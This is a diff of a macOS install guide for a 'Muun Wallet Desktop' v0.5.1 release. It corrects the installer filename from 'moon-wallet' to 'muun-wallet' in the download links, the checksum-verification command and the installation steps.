@@ -1,6 +1,6 @@
-[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
+﻿[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
 
-[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)
 
 ---
 
@@ -21,12 +21,12 @@ This guide covers installing Muun Wallet Desktop on macOS, including the standar
 
 ## Step 1: Download the macOS installer
 
-Download `moon-wallet-v0.5.1.dmg` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg).
+Download `muun-wallet-v0.5.1.dmg` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg).
 
 Before opening the file, verify the SHA-256 checksum. Open Terminal and run:
 
 ```bash
-shasum -a 256 ~/Downloads/moon-wallet-v0.5.1.dmg
+shasum -a 256 ~/Downloads/muun-wallet-v0.5.1.dmg
 ```
 
 The output should match exactly:
@@ -41,7 +41,7 @@ If it does not match, do not open the file. Download again from the [release pag
 
 ## Step 2: Open the disk image and install
 
-Double-click `moon-wallet-v0.5.1.dmg`. A disk image window opens showing the Muun Wallet icon and an Applications folder shortcut. Drag the Muun Wallet icon into Applications.
+Double-click `muun-wallet-v0.5.1.dmg`. A disk image window opens showing the Muun Wallet icon and an Applications folder shortcut. Drag the Muun Wallet icon into Applications.
 
 Wait for the copy to complete — the progress bar should reach 100% before you proceed. Once done, eject the disk image by right-clicking it in the Finder sidebar and choosing Eject, or by dragging it to the Trash.
 
